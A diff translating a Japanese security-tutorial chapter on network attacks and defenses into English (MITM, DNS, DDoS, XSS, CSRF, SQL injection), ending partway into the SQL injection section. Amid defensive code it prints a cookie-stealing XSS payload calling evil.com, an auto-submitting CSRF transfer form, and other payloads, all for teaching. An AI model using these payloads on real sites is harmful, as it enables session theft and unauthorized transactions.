@@ -1,101 +1,101 @@
-# ネットワーク攻撃と対策
+# Network Attacks and Countermeasures
 
-> ネットワーク上の主要な攻撃手法と防御策を理解する。MITM、DNS汚染、DDoS、セッションハイジャック、SQLインジェクション等を学び、安全なシステム設計の基盤を固める。
+> Understand the major attack techniques and defenses on networks. Learn about MITM, DNS poisoning, DDoS, session hijacking, SQL injection, and more to build a solid foundation for secure system design.
 
-## 前提知識
+## Prerequisites
 
-このガイドを読む前に、以下の知識があると理解が深まります:
+Having the following knowledge before reading this guide will deepen your understanding:
 
-- [TLS/SSL](./00-tls-ssl.md) — TLSハンドシェイク、証明書チェーン、暗号スイートの基礎
-- [認証方式](./01-authentication.md) — OAuth 2.0、JWT、セッション管理の仕組み
-- [HTTP基礎](../02-http/00-http-basics.md) — HTTPリクエスト/レスポンス、ヘッダー、ステータスコード
-- [DNS](../00-introduction/03-dns.md) — DNS名前解決の流れ、レコードタイプ、キャッシュの仕組み
-- [TCP](../01-protocols/00-tcp.md) — TCP 3ウェイハンドシェイク、ポート番号、コネクション管理
-
----
-
-## この章で学ぶこと
-
-- [ ] 主要なネットワーク攻撃の仕組みを理解する
-- [ ] 各攻撃に対する防御策を把握する
-- [ ] セキュリティ設計の原則を学ぶ
-- [ ] セキュリティヘッダーの設定方法を習得する
-- [ ] インシデント対応の基本を理解する
+- [TLS/SSL](./00-tls-ssl.md) — Basics of TLS handshake, certificate chains, and cipher suites
+- [Authentication Methods](./01-authentication.md) — How OAuth 2.0, JWT, and session management work
+- [HTTP Basics](../02-http/00-http-basics.md) — HTTP requests/responses, headers, status codes
+- [DNS](../00-introduction/03-dns.md) — DNS name resolution flow, record types, caching
+- [TCP](../01-protocols/00-tcp.md) — TCP 3-way handshake, port numbers, connection management
 
 ---
 
-## 1. 中間者攻撃（MITM）
+## What You Will Learn in This Chapter
+
+- [ ] Understand how major network attacks work
+- [ ] Know the defenses against each attack
+- [ ] Learn the principles of security design
+- [ ] Master how to configure security headers
+- [ ] Understand the basics of incident response
+
+---
+
+## 1. Man-in-the-Middle (MITM) Attack
 
 ```
-MITM（Man-in-the-Middle）:
-  → 通信の間に入り込み、盗聴・改ざんする
+MITM (Man-in-the-Middle):
+  → Intercepts communication to eavesdrop or tamper
 
-  正常:  クライアント ←──────→ サーバー
-  MITM:  クライアント ←→ 攻撃者 ←→ サーバー
+  Normal: Client ←──────→ Server
+  MITM:   Client ←→ Attacker ←→ Server
 
-  攻撃手法:
-  ① ARPスプーフィング:
-     → LANで偽のARP応答を送り、通信を自分に向ける
-     → 同一LAN内の攻撃
+  Attack methods:
+  ① ARP Spoofing:
+     → Sends fake ARP replies on a LAN to redirect traffic
+     → Attack within the same LAN
 
-     正常: PC → ルーター（MAC: AA:BB:CC:DD:EE:FF）
-     攻撃: PC → 攻撃者（MAC: 11:22:33:44:55:66）→ ルーター
+     Normal: PC → Router (MAC: AA:BB:CC:DD:EE:FF)
+     Attack: PC → Attacker (MAC: 11:22:33:44:55:66) → Router
 
-     ツール: arpspoof, ettercap, bettercap
+     Tools: arpspoof, ettercap, bettercap
 
-  ② Wi-Fiスニッフィング:
-     → 暗号化されていないWi-Fiで通信を傍受
-     → Evil Twin: 正規のAPと同名の偽APを設置
+  ② Wi-Fi Sniffing:
+     → Intercepts traffic on unencrypted Wi-Fi
+     → Evil Twin: sets up a fake AP with the same name as the legitimate AP
 
-     正規AP: "Coffee-Shop-WiFi"（暗号化あり）
-     偽AP:   "Coffee-Shop-WiFi"（暗号化なし）
-     → ユーザーが偽APに接続 → 全通信を傍受
+     Legitimate AP: "Coffee-Shop-WiFi" (encrypted)
+     Fake AP:       "Coffee-Shop-WiFi" (unencrypted)
+     → User connects to fake AP → all traffic is intercepted
 
-  ③ SSLストリッピング:
-     → HTTPS接続をHTTPにダウングレード
-     → ユーザーはHTTPで通信していることに気づかない
+  ③ SSL Stripping:
+     → Downgrades HTTPS connections to HTTP
+     → User is unaware they are communicating over HTTP
 
-     ユーザー ──HTTP──→ 攻撃者 ──HTTPS──→ サーバー
-     → 攻撃者がHTTPSを終端し、ユーザーにはHTTPで中継
+     User ──HTTP──→ Attacker ──HTTPS──→ Server
+     → Attacker terminates HTTPS and relays to user over HTTP
 
-  ④ BGPハイジャック:
-     → BGP経路広告を操作してトラフィックを別経路に流す
-     → 大規模な通信傍受が可能
-     → 実例: 2018年のAmazon Route 53ハイジャック
+  ④ BGP Hijacking:
+     → Manipulates BGP route advertisements to redirect traffic
+     → Enables large-scale traffic interception
+     → Example: 2018 Amazon Route 53 hijacking
 
-  防御策:
-  ✓ HTTPS（TLS）の必須化
-  ✓ HSTS（HTTP Strict Transport Security）
+  Defenses:
+  ✓ Enforce HTTPS (TLS)
+  ✓ HSTS (HTTP Strict Transport Security)
      Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-  ✓ 証明書ピンニング（モバイルアプリ）
-  ✓ 公共Wi-FiではVPN使用
-  ✓ RPKI（Resource Public Key Infrastructure）でBGP保護
+  ✓ Certificate pinning (mobile apps)
+  ✓ Use VPN on public Wi-Fi
+  ✓ RPKI (Resource Public Key Infrastructure) to protect BGP
 ```
 
-### 1.1 ARPスプーフィング対策の実装
+### 1.1 Implementing ARP Spoofing Countermeasures
 
 ```bash
-# ARPテーブルの確認
+# Check the ARP table
 $ arp -a
 
-# 静的ARPエントリの設定（重要なゲートウェイ）
+# Set static ARP entry (for important gateways)
 $ sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF
 
-# arpwatchで変更を監視（Linux）
+# Monitor for ARP changes with arpwatch (Linux)
 $ sudo apt install arpwatch
 $ sudo arpwatch -i eth0
 
-# DAI（Dynamic ARP Inspection）— Ciscoスイッチ
-# DHCPスヌーピングと連携してARP応答を検証
+# DAI (Dynamic ARP Inspection) — Cisco switch
+# Validates ARP replies in conjunction with DHCP snooping
 interface GigabitEthernet0/1
-  ip arp inspection trust  # アップリンクポートは信頼
+  ip arp inspection trust  # Trust uplink ports
 
-# 802.1X認証（ネットワークアクセス制御）
-# → 未認証デバイスをネットワークから排除
+# 802.1X authentication (network access control)
+# → Exclude unauthenticated devices from the network
 ```
 
 ```python
-# ARP監視スクリプト（Python / Scapy）
+# ARP monitoring script (Python / Scapy)
 from scapy.all import ARP, sniff
 from collections import defaultdict
 import logging
@@ -103,12 +103,12 @@ import logging
 logging.basicConfig(level=logging.WARNING)
 logger = logging.getLogger("arp_monitor")
 
-# IPアドレスとMACアドレスのマッピング
+# Mapping of IP addresses to MAC addresses
 arp_table = defaultdict(set)
 
 def detect_arp_spoof(packet):
-    """ARPスプーフィングを検知する"""
-    if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP応答
+    """Detect ARP spoofing"""
+    if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP reply
         src_ip = packet[ARP].psrc
         src_mac = packet[ARP].hwsrc
 
@@ -119,266 +119,266 @@ def detect_arp_spoof(packet):
                     f"IP {src_ip} was {arp_table[src_ip]}, "
                     f"now claims to be {src_mac}"
                 )
-                # アラート送信、ネットワーク管理者に通知
+                # Send alert, notify network administrator
                 send_alert(src_ip, arp_table[src_ip], src_mac)
 
         arp_table[src_ip].add(src_mac)
 
 def send_alert(ip, old_macs, new_mac):
-    """セキュリティアラートを送信"""
-    # Slack, PagerDuty等に通知
+    """Send a security alert"""
+    # Notify via Slack, PagerDuty, etc.
     pass
 
-# 監視開始
+# Start monitoring
 sniff(filter="arp", prn=detect_arp_spoof, store=0)
 ```
 
 ---
 
-## 2. DNS攻撃
+## 2. DNS Attacks
 
 ```
-① DNSキャッシュポイズニング:
-  → リゾルバのキャッシュに偽のレコードを注入
-  → ユーザーを偽サイトに誘導
+① DNS Cache Poisoning:
+  → Injects fake records into a resolver's cache
+  → Redirects users to fake sites
 
-  正常: example.com → 93.184.216.34（正しいIP）
-  攻撃: example.com → 192.0.2.100（攻撃者のIP）
+  Normal: example.com → 93.184.216.34 (correct IP)
+  Attack: example.com → 192.0.2.100 (attacker's IP)
 
-  攻撃手法（Kaminsky Attack）:
-  1. 攻撃者がリゾルバにランダムなサブドメインを問い合わせ
+  Attack method (Kaminsky Attack):
+  1. Attacker queries the resolver for random subdomains
      → random12345.example.com
-  2. リゾルバが権威DNSに問い合わせ中に大量の偽レスポンスを送信
-  3. トランザクションIDが一致すれば偽レスポンスが受理
-  4. キャッシュに偽のNSレコードが注入 → example.com全体を乗っ取り
+  2. While the resolver queries the authoritative DNS, sends a flood of fake responses
+  3. If the transaction ID matches, the fake response is accepted
+  4. Fake NS record is injected into the cache → takeover of all of example.com
 
-  防御: DNSSEC（DNS Security Extensions）
-  → DNSレコードに電子署名を付与
-  → 改ざんを検知可能
+  Defense: DNSSEC (DNS Security Extensions)
+  → Adds digital signatures to DNS records
+  → Enables detection of tampering
 
-  DNSSEC検証チェーン:
-  ルートゾーン（.）→ TLD（.com）→ ドメイン（example.com）
-  各レベルでRRSIG（署名）+ DNSKEY（公開鍵）+ DS（委任署名者）
+  DNSSEC validation chain:
+  Root zone (.) → TLD (.com) → Domain (example.com)
+  At each level: RRSIG (signature) + DNSKEY (public key) + DS (delegation signer)
 
-② DNSハイジャック:
-  → ドメインの権威DNSサーバーの設定を変更
-  → レジストラのアカウント侵害等
+② DNS Hijacking:
+  → Modifies the authoritative DNS server configuration for a domain
+  → Via registrar account compromise, etc.
 
-  実例:
-  → 2018年: Sea Turtle攻撃（国家レベルのDNSハイジャック）
-  → 2019年: GoDaddy従業員によるソーシャルエンジニアリング
+  Examples:
+  → 2018: Sea Turtle attack (nation-state-level DNS hijacking)
+  → 2019: GoDaddy employee social engineering
 
-  防御:
-  ✓ レジストラの2FA有効化
-  ✓ ドメインロック（clientTransferProhibited）
-  ✓ レジストリロック（高価値ドメイン、月額$50-300）
-  ✓ DNS変更の監視（CAA, Certificate Transparency）
+  Defenses:
+  ✓ Enable 2FA at your registrar
+  ✓ Domain lock (clientTransferProhibited)
+  ✓ Registry lock (high-value domains, $50–300/month)
+  ✓ Monitor DNS changes (CAA, Certificate Transparency)
 
-③ DNS増幅攻撃（DDoSの一種）:
-  → 送信元IPを偽装してDNSに問い合わせ
-  → 小さなリクエストで大きなレスポンスを被害者に集中
+③ DNS Amplification Attack (a type of DDoS):
+  → Spoofs the source IP to query DNS
+  → Small request generates a large response directed at the victim
 
-  リクエスト: 64バイト → レスポンス: 3,000バイト
-  → 約50倍の増幅
+  Request: 64 bytes → Response: 3,000 bytes
+  → ~50x amplification
 
-  増幅に使われるプロトコル:
-  DNS:     50倍
-  NTP:     550倍
-  memcached: 50,000倍
-  SSDP:    30倍
+  Protocols used for amplification:
+  DNS:       50x
+  NTP:       550x
+  memcached: 50,000x
+  SSDP:      30x
 
-④ DNSトンネリング:
-  → DNS問い合わせにデータを埋め込んで通信
-  → ファイアウォールを迂回
+④ DNS Tunneling:
+  → Embeds data in DNS queries to communicate
+  → Bypasses firewalls
 
-  data.encoded-payload.evil.com → TXTレコードで応答データ返却
-  → C2（Command & Control）通信に悪用
+  data.encoded-payload.evil.com → returns data via TXT record
+  → Abused for C2 (Command & Control) communication
 
-  検知:
-  → 異常に長いDNSクエリ
-  → TXTレコードの高頻度問い合わせ
-  → 未知ドメインへの大量DNS問い合わせ
+  Detection:
+  → Abnormally long DNS queries
+  → High-frequency TXT record queries
+  → Large volume of DNS queries to unknown domains
 ```
 
-### 2.1 DNSSEC設定と検証
+### 2.1 DNSSEC Configuration and Validation
 
 ```bash
-# DNSSEC の検証確認
+# Verify DNSSEC validation
 $ dig example.com +dnssec +short
 93.184.216.34
-A 13 2 86400 20240401120000 20240301120000 12345 example.com. <署名値>
+A 13 2 86400 20240401120000 20240301120000 12345 example.com. <signature>
 
-# DNSSEC チェーンの確認
+# Verify the DNSSEC chain
 $ dig example.com +sigchase +trusted-key=./root.keys
 
-# DNSSECが有効か確認
+# Check if DNSSEC is enabled
 $ dig example.com +short +cd  # CD=Checking Disabled
-$ dig example.com +short       # DNSSEC検証あり
-# 両方同じ結果 → 正常
-# CD付きのみ結果あり → DNSSEC検証失敗
+$ dig example.com +short       # with DNSSEC validation
+# Same result from both → normal
+# Result only with +cd → DNSSEC validation failure
 
-# drill コマンドでDNSSEC検証（ldns-utils）
+# Verify DNSSEC with drill (ldns-utils)
 $ drill -S example.com
 
-# DNSViz（オンライン検証）
+# DNSViz (online validation)
 # https://dnsviz.net/d/example.com/dnssec/
 
-# unbound でDNSSEC検証（ローカルリゾルバ）
+# DNSSEC validation with unbound (local resolver)
 # /etc/unbound/unbound.conf
 server:
     auto-trust-anchor-file: "/var/lib/unbound/root.key"
     val-clean-additional: yes
-    val-permissive-mode: no  # 検証失敗時にSERVFAIL返却
+    val-permissive-mode: no  # Return SERVFAIL on validation failure
 ```
 
 ---
 
-## 3. DDoS攻撃
+## 3. DDoS Attacks
 
 ```
-DDoS（Distributed Denial of Service）:
-  → 大量のトラフィックでサービスを停止させる
+DDoS (Distributed Denial of Service):
+  → Takes down a service with massive traffic
 
-  攻撃規模の進化:
-  2010年代: 数十 Gbps
-  2020年代: 数 Tbps（テラビット級）
-  2023年: Cloudflareが201百万RPSのHTTP DDoSを記録
+  Evolution of attack scale:
+  2010s: Tens of Gbps
+  2020s: Several Tbps (terabit-scale)
+  2023: Cloudflare recorded an HTTP DDoS of 201 million RPS
 
-  攻撃の分類:
-  ┌──────────┬──────────────────────────────────┐
-  │ 層       │ 攻撃手法                          │
-  ├──────────┼──────────────────────────────────┤
-  │ L3/L4    │ SYNフラッド: 大量のSYNパケット    │
-  │（ネット）│ UDPフラッド: 大量のUDPパケット    │
-  │          │ 増幅攻撃: DNS/NTP/memcached       │
-  │          │ ICMP フラッド: ping of death       │
-  │          │ フラグメント攻撃: 断片パケット集中│
-  ├──────────┼──────────────────────────────────┤
-  │ L7       │ HTTPフラッド: 大量のHTTPリクエスト│
-  │（アプリ）│ Slowloris: 接続を長時間占有      │
-  │          │ RUDY: POSTボディを低速送信        │
-  │          │ API乱用: 高コストなAPI呼び出し    │
-  │          │ ReDoS: 正規表現の計算爆発          │
-  └──────────┴──────────────────────────────────┘
+  Attack classification:
+  ┌──────────────┬──────────────────────────────────┐
+  │ Layer        │ Attack method                     │
+  ├──────────────┼──────────────────────────────────┤
+  │ L3/L4        │ SYN flood: massive SYN packets    │
+  │ (Network)    │ UDP flood: massive UDP packets    │
+  │              │ Amplification: DNS/NTP/memcached  │
+  │              │ ICMP flood: ping of death         │
+  │              │ Fragmentation: fragmented packets │
+  ├──────────────┼──────────────────────────────────┤
+  │ L7           │ HTTP flood: massive HTTP requests │
+  │ (App)        │ Slowloris: holds connections open │
+  │              │ RUDY: sends POST body very slowly │
+  │              │ API abuse: expensive API calls    │
+  │              │ ReDoS: regex computation explosion│
+  └──────────────┴──────────────────────────────────┘
 ```
 
-### 3.1 各攻撃の詳細と防御
+### 3.1 Details and Defenses for Each Attack
 
 ```
-SYNフラッド:
-  → TCPの3-wayハンドシェイクを悪用
-  → 大量のSYNパケットを送信、ACKを返さない
-  → サーバーのSYNキューが枯渇
+SYN Flood:
+  → Exploits the TCP 3-way handshake
+  → Sends massive SYN packets without returning ACK
+  → Exhausts the server's SYN queue
 
-  攻撃者 ── SYN ──→ サーバー（SYN_RECEIVED状態で待機）
-  攻撃者 ── SYN ──→ サーバー（SYN_RECEIVED状態で待機）
-  ... 数千〜数百万のSYN
+  Attacker ── SYN ──→ Server (waits in SYN_RECEIVED state)
+  Attacker ── SYN ──→ Server (waits in SYN_RECEIVED state)
+  ... thousands to millions of SYNs
 
-  防御:
+  Defenses:
   ① SYN Cookie:
-     → サーバーがSYN_RECEIVEDの状態を保持しない
-     → SYNのACKにシーケンス番号として暗号化情報を含める
-     → クライアントのACKからセッション情報を復元
+     → Server does not maintain SYN_RECEIVED state
+     → Includes encrypted info as the sequence number in SYN-ACK
+     → Recovers session info from the client's ACK
 
-  ② SYNプロキシ:
-     → ロードバランサーやファイアウォールが3-wayハンドシェイクを代行
-     → 正常なハンドシェイク完了後にバックエンドに転送
+  ② SYN Proxy:
+     → Load balancer or firewall performs the 3-way handshake on behalf
+     → Forwards to the backend only after a successful handshake
 
-  ③ カーネルパラメータ調整（Linux）:
+  ③ Kernel parameter tuning (Linux):
      net.ipv4.tcp_syncookies = 1
      net.ipv4.tcp_max_syn_backlog = 65535
      net.ipv4.tcp_synack_retries = 2
      net.core.somaxconn = 65535
 
 Slowloris:
-  → HTTPリクエストヘッダーを極めて低速に送信
-  → サーバーのコネクション数を枯渇させる
-  → 少ないリソースで効果的
+  → Sends HTTP request headers extremely slowly
+  → Exhausts the server's connection count
+  → Effective with few resources
 
-  攻撃:
+  Attack:
   GET / HTTP/1.1\r\n
   Host: target.com\r\n
-  X-a: 1\r\n          ← 数秒間隔でヘッダーを追加し続ける
-  X-b: 2\r\n          ← リクエストが完了しない
-  ...                  ← タイムアウトまでコネクション占有
+  X-a: 1\r\n          ← keeps adding headers at intervals of seconds
+  X-b: 2\r\n          ← request never completes
+  ...                  ← holds the connection until timeout
 
-  防御:
-  ✓ リクエストヘッダーのタイムアウト設定
+  Defenses:
+  ✓ Set timeout for request headers
     Nginx: client_header_timeout 10s;
     Apache: RequestReadTimeout header=10-20,MinRate=500
-  ✓ 同一IPからのコネクション数制限
-  ✓ リバースプロキシの導入（Nginx は Slowloris に強い）
+  ✓ Limit connections per IP
+  ✓ Use reverse proxy (Nginx is resistant to Slowloris)
 
-HTTP フラッド（L7 DDoS）:
-  → 正常なHTTPリクエストを大量送信
-  → ボットネットから分散して送信
-  → 正規トラフィックとの区別が困難
+HTTP Flood (L7 DDoS):
+  → Sends a massive number of normal HTTP requests
+  → Distributed from a botnet
+  → Difficult to distinguish from legitimate traffic
 
-  防御:
-  ✓ WAF（Web Application Firewall）
-  ✓ レート制限（IP/ユーザーベース）
-  ✓ CAPTCHAチャレンジ
-  ✓ JavaScriptチャレンジ（Bot検知）
-  ✓ 行動分析（異常検知）
+  Defenses:
+  ✓ WAF (Web Application Firewall)
+  ✓ Rate limiting (IP/user-based)
+  ✓ CAPTCHA challenges
+  ✓ JavaScript challenges (bot detection)
+  ✓ Behavioral analysis (anomaly detection)
 ```
 
-### 3.2 DDoS防御の多層アプローチ
+### 3.2 Multi-Layer DDoS Defense Approach
 
 ```
-DDoS防御の全体像:
+Overview of DDoS defense:
 
   ┌─────────────────────────────────────────┐
-  │ CDN / DDoS Protection（Cloudflare等）    │ ← L3/L4/L7
-  │   → Anycast で分散受信                   │
-  │   → 不正トラフィックを吸収               │
+  │ CDN / DDoS Protection (Cloudflare, etc.)│ ← L3/L4/L7
+  │   → Distributed reception via Anycast   │
+  │   → Absorbs malicious traffic           │
   ├─────────────────────────────────────────┤
-  │ WAF（Web Application Firewall）          │ ← L7
-  │   → SQLi, XSS, Bot等のフィルタリング     │
-  │   → IPレピュテーション                   │
+  │ WAF (Web Application Firewall)          │ ← L7
+  │   → Filters SQLi, XSS, bots, etc.      │
+  │   → IP reputation                      │
   ├─────────────────────────────────────────┤
-  │ ロードバランサー                         │ ← L4/L7
-  │   → ヘルスチェック、オートスケール連携    │
+  │ Load Balancer                           │ ← L4/L7
+  │   → Health checks, auto-scale support   │
   ├─────────────────────────────────────────┤
-  │ レート制限                               │ ← L7
-  │   → Nginx / API Gateway                  │
-  │   → IP, ユーザー, APIキー単位             │
+  │ Rate Limiting                           │ ← L7
+  │   → Nginx / API Gateway                │
+  │   → Per IP, user, API key              │
   ├─────────────────────────────────────────┤
-  │ アプリケーション                         │
-  │   → 入力検証、キャッシュ                  │
-  │   → サーキットブレーカー                  │
+  │ Application                             │
+  │   → Input validation, caching          │
+  │   → Circuit breaker                    │
   └─────────────────────────────────────────┘
 ```
 
 ```nginx
-# Nginx レート制限設定
+# Nginx rate limiting configuration
 http {
-    # レート制限ゾーンの定義
+    # Define rate limiting zones
     limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
     limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
 
-    # コネクション数制限
+    # Connection count limiting
     limit_conn_zone $binary_remote_addr zone=addr:10m;
 
     server {
-        # API エンドポイント: 10リクエスト/秒、バースト20
+        # API endpoint: 10 requests/sec, burst 20
         location /api/ {
             limit_req zone=api burst=20 nodelay;
             limit_req_status 429;
 
-            # コネクション数制限
+            # Connection count limiting
             limit_conn addr 100;
 
             proxy_pass http://backend;
         }
 
-        # ログインエンドポイント: 1リクエスト/秒、バースト5
+        # Login endpoint: 1 request/sec, burst 5
         location /api/auth/login {
             limit_req zone=login burst=5 nodelay;
             limit_req_status 429;
             proxy_pass http://backend;
         }
 
-        # 429レスポンスのカスタマイズ
+        # Customize 429 response
         error_page 429 = @rate_limited;
         location @rate_limited {
             default_type application/json;
@@ -389,14 +389,14 @@ http {
 ```
 
 ```python
-# Python / FastAPIでのレート制限実装
+# Rate limiting implementation in Python / FastAPI
 from fastapi import FastAPI, Request, HTTPException
 from datetime import datetime, timedelta
 import asyncio
 
 app = FastAPI()
 
-# スライディングウィンドウカウンター（Redis推奨）
+# Sliding window counter (Redis recommended)
 class RateLimiter:
     def __init__(self, max_requests: int, window_seconds: int):
         self.max_requests = max_requests
@@ -409,7 +409,7 @@ class RateLimiter:
             now = datetime.now().timestamp()
             window_start = now - self.window_seconds
 
-            # ウィンドウ外のリクエストを削除
+            # Remove requests outside the window
             if key in self.requests:
                 self.requests[key] = [
                     t for t in self.requests[key] if t > window_start
@@ -433,10 +433,10 @@ class RateLimiter:
             self.requests[key].append(now)
             return True, headers
 
-# API: 100リクエスト/分
+# API: 100 requests/minute
 api_limiter = RateLimiter(max_requests=100, window_seconds=60)
 
-# ログイン: 5リクエスト/分
+# Login: 5 requests/minute
 login_limiter = RateLimiter(max_requests=5, window_seconds=60)
 
 @app.middleware("http")
@@ -468,48 +468,48 @@ async def rate_limit_middleware(request: Request, call_next):
 
 ---
 
-## 4. Webアプリケーション攻撃
+## 4. Web Application Attacks
 
-### 4.1 XSS（Cross-Site Scripting）
+### 4.1 XSS (Cross-Site Scripting)
 
 ```
-XSS（Cross-Site Scripting）:
-  → 悪意のあるスクリプトをWebページに注入
+XSS (Cross-Site Scripting):
+  → Injects malicious scripts into web pages
 
-  タイプ:
-  ① Stored XSS（格納型）:
-     → DBに保存される（コメント欄等）
-     → 全ユーザーに影響
-     → 最も危険
+  Types:
+  ① Stored XSS:
+     → Saved in the DB (e.g., comment fields)
+     → Affects all users
+     → Most dangerous
 
-     攻撃: コメント欄に投稿:
+     Attack: Post in comment field:
      <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
 
-     → 他のユーザーがページを閲覧 → Cookie窃取
+     → Other users view the page → cookies are stolen
 
-  ② Reflected XSS（反射型）:
-     → URLパラメータ経由
-     → フィッシングメールのリンクで誘導
+  ② Reflected XSS:
+     → Via URL parameters
+     → Victim is lured via phishing email link
 
-     攻撃URL:
+     Attack URL:
      https://example.com/search?q=<script>alert(document.cookie)</script>
 
   ③ DOM-based XSS:
-     → クライアント側のJS処理で発生
-     → サーバーを経由しない
+     → Occurs in client-side JS processing
+     → Does not go through the server
 
-     脆弱なコード:
+     Vulnerable code:
      document.getElementById('output').innerHTML = location.hash.substring(1);
 
-     攻撃: https://example.com/#<img src=x onerror=alert(1)>
+     Attack: https://example.com/#<img src=x onerror=alert(1)>
 
-  防御策の詳細:
+  Defense details:
 
-  ① 出力エスケープ:
+  ① Output escaping:
      HTML: < → &lt;  > → &gt;  & → &amp;  " → &quot;
-     JavaScript: Unicode エスケープ
-     URL: パーセントエンコーディング
-     CSS: バックスラッシュエスケープ
+     JavaScript: Unicode escaping
+     URL: Percent-encoding
+     CSS: Backslash escaping
 
   ② Content-Security-Policy:
      Content-Security-Policy:
@@ -523,22 +523,22 @@ XSS（Cross-Site Scripting）:
        base-uri 'self';
        form-action 'self';
 
-     nonce ベース:
-     <script nonce="abc123">/* 許可されたスクリプト */</script>
+     Nonce-based:
+     <script nonce="abc123">/* permitted script */</script>
 
   ③ HttpOnly Cookie:
      Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
-     → JavaScriptからdocument.cookieでアクセス不可
+     → Cannot be accessed from JavaScript via document.cookie
 
-  ④ Trusted Types（Chrome実装）:
+  ④ Trusted Types (implemented in Chrome):
      Content-Security-Policy: require-trusted-types-for 'script'
-     → innerHTML等の危険なAPIの直接使用を禁止
+     → Prohibits direct use of dangerous APIs such as innerHTML
 ```
 
 ```typescript
-// XSS対策の実装例（TypeScript）
+// XSS countermeasure implementation (TypeScript)
 
-// HTMLエスケープ
+// HTML escaping
 function escapeHtml(unsafe: string): string {
   return unsafe
     .replace(/&/g, "&amp;")
@@ -548,10 +548,10 @@ function escapeHtml(unsafe: string): string {
     .replace(/'/g, "&#039;");
 }
 
-// DOMPurify によるサニタイズ（ライブラリ使用推奨）
+// Sanitization with DOMPurify (library recommended)
 import DOMPurify from 'dompurify';
 
-// リッチテキストの安全な挿入
+// Safe insertion of rich text
 function safeInsertHtml(element: HTMLElement, html: string): void {
   const clean = DOMPurify.sanitize(html, {
     ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
@@ -561,14 +561,14 @@ function safeInsertHtml(element: HTMLElement, html: string): void {
   element.innerHTML = clean;
 }
 
-// CSP nonce生成（サーバーサイド）
+// CSP nonce generation (server-side)
 import crypto from 'crypto';
 
 function generateCspNonce(): string {
   return crypto.randomBytes(16).toString('base64');
 }
 
-// Express ミドルウェアでCSP設定
+// Setting CSP in Express middleware
 function cspMiddleware(req: any, res: any, next: any) {
   const nonce = generateCspNonce();
   res.locals.cspNonce = nonce;
@@ -588,30 +588,30 @@ function cspMiddleware(req: any, res: any, next: any) {
 }
 ```
 
-### 4.2 CSRF（Cross-Site Request Forgery）
+### 4.2 CSRF (Cross-Site Request Forgery)
 
 ```
-CSRF（Cross-Site Request Forgery）:
-  → ユーザーの認証状態を悪用して意図しない操作を実行
+CSRF (Cross-Site Request Forgery):
+  → Exploits a user's authenticated state to perform unintended actions
 
-  攻撃シナリオ:
-  1. ユーザーが銀行サイトにログイン中
-  2. 攻撃者の罠サイトにアクセス
-  3. 罠サイトが自動的に銀行APIにリクエストを送信
-  4. ユーザーのCookieが自動送信 → 送金が実行される
+  Attack scenario:
+  1. User is logged into a banking site
+  2. User visits attacker's trap site
+  3. The trap site automatically sends a request to the bank API
+  4. User's cookie is sent automatically → transfer is executed
 
-  攻撃コード（罠サイト）:
+  Attack code (trap site):
   <form action="https://bank.example.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker" />
     <input type="hidden" name="amount" value="1000000" />
   </form>
   <script>document.forms[0].submit();</script>
 
-  防御策:
+  Defenses:
 
-  ① CSRFトークン（Synchronizer Token Pattern）:
-     → フォームに一意のトークンを埋め込み
-     → サーバーでリクエスト時に検証
+  ① CSRF Token (Synchronizer Token Pattern):
+     → Embeds a unique token in the form
+     → Server verifies the token on each request
 
      <form action="/transfer" method="POST">
        <input type="hidden" name="_csrf" value="random-token-abc" />
@@ -619,28 +619,28 @@ CSRF（Cross-Site Request Forgery）:
      </form>
 
   ② Double Submit Cookie:
-     → CSRFトークンをCookieとリクエストボディの両方に含める
-     → サーバーで両者の一致を確認
-     → ステートレスで実装可能
+     → Includes the CSRF token in both the cookie and request body
+     → Server verifies that both match
+     → Can be implemented statelessly
 
   ③ SameSite Cookie:
      Set-Cookie: session=abc; SameSite=Lax
 
-     SameSite=Strict: クロスサイトリクエストでCookieを送信しない
-     SameSite=Lax:    トップレベルナビゲーション（GETリンク）のみ送信
-     SameSite=None:   送信する（Secure属性必須）
+     SameSite=Strict: Does not send cookie on cross-site requests
+     SameSite=Lax:    Sends only on top-level navigation (GET links)
+     SameSite=None:   Sends (requires Secure attribute)
 
-  ④ Origin / Referer ヘッダーの検証:
-     → リクエスト元のドメインを確認
-     → 自ドメイン以外からのリクエストを拒否
+  ④ Validate Origin / Referer headers:
+     → Verify the request origin domain
+     → Reject requests from domains other than your own
 
-  ⑤ カスタムヘッダーの要求:
+  ⑤ Require custom headers:
      → X-Requested-With: XMLHttpRequest
-     → CORSプリフライトが必要になり、クロスサイトから送信不可
+     → Requires a CORS preflight, preventing cross-site submission
 ```
 
 ```python
-# CSRF対策実装（Python / FastAPI）
+# CSRF countermeasure implementation (Python / FastAPI)
 from fastapi import FastAPI, Request, Form, HTTPException
 from fastapi.responses import HTMLResponse
 import secrets
@@ -648,13 +648,13 @@ import hmac
 
 app = FastAPI()
 
-# CSRFトークン生成・検証
+# CSRF token generation and verification
 class CSRFProtection:
     def __init__(self, secret_key: str):
         self.secret_key = secret_key
 
     def generate_token(self, session_id: str) -> str:
-        """セッションに紐づいたCSRFトークンを生成"""
+        """Generate a CSRF token tied to the session"""
         random_part = secrets.token_hex(16)
         signature = hmac.new(
             self.secret_key.encode(),
@@ -664,7 +664,7 @@ class CSRFProtection:
         return f"{random_part}:{signature}"
 
     def verify_token(self, session_id: str, token: str) -> bool:
-        """CSRFトークンを検証"""
+        """Verify a CSRF token"""
         try:
             random_part, signature = token.split(":")
             expected = hmac.new(
@@ -686,7 +686,7 @@ async def get_form(request: Request):
     <form method="POST" action="/submit">
         <input type="hidden" name="_csrf" value="{token}" />
         <input type="text" name="data" />
-        <button type="submit">送信</button>
+        <button type="submit">Submit</button>
     </form>
     """
 
@@ -702,56 +702,56 @@ async def submit_form(
     return {"message": "Success", "data": data}
 ```
 
-### 4.3 SQLインジェクション
+### 4.3 SQL Injection
 
 ```
-SQLインジェクション:
-  → SQL文に悪意のある入力を注入
+SQL Injection:
+  → Injects malicious input into SQL statements
 
-  攻撃例:
-  入力: ' OR 1=1 --
+  Attack example:
+  Input: ' OR 1=1 --
